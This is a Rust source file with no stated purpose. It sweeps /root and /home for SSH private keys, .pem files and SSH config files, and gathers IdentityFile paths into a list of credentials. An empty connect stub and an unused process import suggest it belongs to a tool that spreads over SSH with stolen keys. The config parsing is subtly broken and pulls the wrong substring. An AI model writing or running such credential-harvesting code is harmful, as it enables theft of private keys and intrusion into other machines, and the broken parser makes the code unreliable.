use std::process::Command;
use std::path::PathBuf;
use std::fs;

use log::warn;


const ID_RSA_PATHS: [&str; 6] = ["/root/id_rsa*", "/root/**/id_rsa*", "/root/**/**/id_rsa*", "/home/id_rsa*", "/home/**/id_rsa*", "/home/**/**/id_rsa*"];
const SSH_CONFIG_PATHS: [&str; 2] = ["/home/**/.ssh/config", "/root/.ssh/config*"];
const PEM_PATHS: [&str; 6] = ["/root/*.pem", "/root/**/*.pem", "/root/**/**/*.pem", "/home/*.pem", "/home/**/*.pem", "/home/**/**/*.pem"];


pub struct Session {
}

impl Session {
    pub fn connect() {
    }
}

pub struct Ssh {
    keys: Vec<PathBuf>,
}

impl Ssh {
    pub fn new() -> Ssh {
        Ssh {
            keys: Vec::new(),
        }
    }

    pub fn extract_id_rsa(&mut self) {
        for pattern in ID_RSA_PATHS.iter() {
            match glob::glob(pattern) {
                Ok(paths) => {
                    let privates = paths.into_iter()
                        .filter_map(|path| path.ok())
                        .filter(|path| {
                            path.extension()
                                .and_then(|extension| extension.to_str())
                                .map(|extension| !extension.ends_with("pub"))
                                .unwrap_or(false)
                        });

                    self.keys.extend(privates);
                },
                Err(err) => {
                    warn!("failed to glob: {}", err);
                },
            }
        }
    }

    pub fn extract_identity(&mut self) {
        let paths = SSH_CONFIG_PATHS.iter()
            .filter_map(|pattern| {
                glob::glob(&pattern)
                    .ok()
                    .map(|paths| paths.filter_map(|entry| entry.ok()).collect::<Vec<PathBuf>>())
            })
            .flatten()
            .collect::<Vec<PathBuf>>();

        let configs = paths.iter()
            .filter_map(|path| fs::read_to_string(path).ok())
            .collect::<String>();

        let identities = configs.match_indices("IdentityFile")
            .map(|(index, _)| configs[index + 1..].chars().take_while(|x| *x != ' ').collect::<String>())
            .collect::<Vec<String>>();

        self.keys.extend(identities.iter().map(|path| PathBuf::from(path)));
    }

    pub fn extract_pem(&mut self) {
        for pattern in PEM_PATHS.iter() {
            match glob::glob(pattern) {
                Ok(paths) => {
                    self.keys.extend(paths.filter_map(|path| path.ok()));
                },
                Err(err) => {
                    warn!("failed to glob: {}", err);
                },
            }
        }
    }
}


